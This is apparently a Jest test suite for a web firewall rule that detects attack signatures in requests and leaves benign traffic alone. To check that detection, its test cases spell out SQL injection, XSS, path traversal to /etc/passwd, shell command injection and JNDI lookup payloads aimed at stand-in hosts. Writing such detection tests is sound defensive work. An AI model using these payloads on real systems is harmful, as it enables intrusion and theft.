import { attackSignatures, ATTACK_SIGNATURE_IDS } from './attack-signatures';
import type { Rule, RuleContext } from './types';

const ctx = (over: Partial<RuleContext> = {}): RuleContext => ({
  ip: '203.0.113.9',
  path: '/',
  method: 'GET',
  headers: {},
  timestamp: Date.now(),
  ...over,
});

const hit = (rule: Rule, c: Partial<RuleContext>) => rule.evaluate(ctx(c)).action === 'DENY';

describe('attack signatures — true positives', () => {
  const rule = attackSignatures();

  it.each([
    ["union select", "?id=1' UNION SELECT password FROM users"],
    ['tautology', "?id=1' OR 1=1--"],
    ['quoted tautology', "?u=admin' or 'a'='a"],
    ['stacked statement', '?id=1; DROP TABLE users'],
    ['timing function', '?id=1 AND sleep(10)'],
    ['metadata probe', '?id=1 UNION SELECT * FROM information_schema.tables'],
    ['script tag', '?q=<script>alert(1)</script>'],
    ['svg onload', '?q=<svg onload=alert(1)>'],
    ['event handler', '?q=<img src=x onerror=alert(1)>'],
    ['traversal', '?file=../../../../etc/passwd'],
    ['sensitive path', '?file=/etc/passwd'],
    ['command injection', '?host=127.0.0.1;cat /etc/hosts'],
    ['subshell', '?x=$(whoami)'],
    ['jndi', '?x=${jndi:ldap://evil.example/a}'],
  ])('catches %s', (_label, query) => {
    expect(hit(rule, { query: query.replace(/^\?/, '') })).toBe(true);
  });

  it('sees through percent-encoding', () => {
    expect(hit(rule, { query: 'file=..%2F..%2F..%2F..%2Fetc%2Fpasswd' })).toBe(true);
    expect(hit(rule, { query: 'q=%3Cscript%3Ealert(1)%3C%2Fscript%3E' })).toBe(true);
  });

  it('sees through double encoding', () => {
    expect(hit(rule, { query: 'q=%253Cscript%253Ealert(1)%253C%252Fscript%253E' })).toBe(true);
  });

  it('inspects the path as well as the query', () => {
    expect(hit(rule, { path: '/files/../../../../etc/passwd' })).toBe(true);
  });

  it('names the signature and where it was found', () => {
    const result = attackSignatures().evaluate(ctx({ query: 'x=${jndi:ldap://e/a}' }));
    expect(result.metadata).toMatchObject({ signature: 'ssti_jndi', where: 'query' });
    expect(result.reason).toMatch(/JNDI/);
  });
});

describe('attack signatures — ordinary traffic must not trip', () => {
  const rule = attackSignatures();

  it.each([
    ['a search phrase using "or"', 'q=coffee or tea'],
    ['a select in prose', 'q=how to select a mattress'],
    ['a URL as a parameter', 'next=https://example.com/a/b?x=1&y=2'],
    ['an email address', 'email=someone%2Btag%40example.com'],
    ['a base64 token', 't=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc-_123'],
    ['a single relative segment', 'next=../dashboard'],
    ['a parameter literally named onerror', 'onerror=1&onload=2'],
    ['a date range', 'from=2026-01-01&to=2026-12-31'],
    ['a price filter', 'price=10..50'],
    ['a JSON-ish parameter', 'filter={"status":"active","count":5}'],
    ['an unclosed percent sign', 'discount=50%&code=SAVE'],
    ['a UUID', 'id=3f2504e0-4f89-11d3-9a0c-0305e82c3301'],
  ])('leaves %s alone', (_label, query) => {
    expect(hit(rule, { query })).toBe(false);
  });

  it.each([
    '/',
    '/api/v1/users/42',
    '/blog/2026/08/how-to-select-a-good-domain',
    '/assets/app.a1b2c3.js',
    '/docs/getting-started#installation',
  ])('leaves the path %s alone', (path) => {
    expect(hit(rule, { path })).toBe(false);
  });
});

describe('what it refuses to look at by default', () => {
  it('ignores the body unless asked', () => {
    const body = '{"content":"<script>alert(1)</script>"}';
    // A CMS saving an article is not an attack, and this is why body inspection
    // is the operator's call.
    expect(hit(attackSignatures(), { body })).toBe(false);
    expect(hit(attackSignatures({ inspect: ['body'] }), { body })).toBe(true);
  });

  it('ignores headers unless asked', () => {
    const headers = { 'x-api-version': '${jndi:ldap://evil/a}' };
    expect(hit(attackSignatures(), { headers })).toBe(false);
    expect(hit(attackSignatures({ inspect: ['headers'] }), { headers })).toBe(true);
  });

  it('never inspects the cookie header, even when headers are on', () => {
    // Session tokens are opaque and application-defined. One that trips a
    // signature logs the user out for a reason nobody can explain.
    const headers = { cookie: 'sid=abc; pref=%3Cscript%3E' };
    expect(hit(attackSignatures({ inspect: ['headers'] }), { headers })).toBe(false);
  });
});

describe('configuration', () => {
  it('honours dryRun', () => {
    const result = attackSignatures({ dryRun: true }).evaluate(ctx({ query: 'x=${jndi:a}' }));
    expect(result.action).toBe('ALLOW');
    expect(result.metadata?.dryRun).toBe(true);
  });

  it('honours exclude', () => {
    const query = 'file=../../../../etc/hosts';
    expect(hit(attackSignatures(), { query })).toBe(true);
    expect(hit(attackSignatures({ exclude: ['traversal'] }), { query })).toBe(false);
  });

  it('can throttle instead of deny', () => {
    expect(attackSignatures({ action: 'THROTTLE' }).evaluate(ctx({ query: 'x=$(id)' })).action).toBe(
      'THROTTLE',
    );
  });

  it('exposes its signature ids for exclude', () => {
    expect(ATTACK_SIGNATURE_IDS).toContain('sqli_union');
    expect(new Set(ATTACK_SIGNATURE_IDS).size).toBe(ATTACK_SIGNATURE_IDS.length);
  });
});

describe('cost', () => {
  it('truncates past maxBytes rather than scanning everything', () => {
    // The payload sits past the cap, so it is not found — which is the trade
    // being made, and the reason the cap is configurable.
    const body = 'a'.repeat(1000) + '${jndi:ldap://evil/a}';
    expect(hit(attackSignatures({ inspect: ['body'], maxBytes: 500 }), { body })).toBe(false);
    expect(hit(attackSignatures({ inspect: ['body'], maxBytes: 5000 }), { body })).toBe(true);
  });

  it('stays fast on a large hostile-looking body', () => {
    // Every pattern is anchored or literal with no nested quantifiers. A regex
    // that backtracks catastrophically here would turn this rule into the
    // denial of service it exists to catch.
    const rule = attackSignatures({ inspect: ['path', 'query', 'body'] });
    const body = `${"'or'".repeat(2000)}${'<a '.repeat(2000)}${'../'.repeat(2000)}`;
    const started = Date.now();
    for (let i = 0; i < 50; i++) rule.evaluate(ctx({ body }));
    const perCall = (Date.now() - started) / 50;
    expect(perCall).toBeLessThan(5);
  });
});
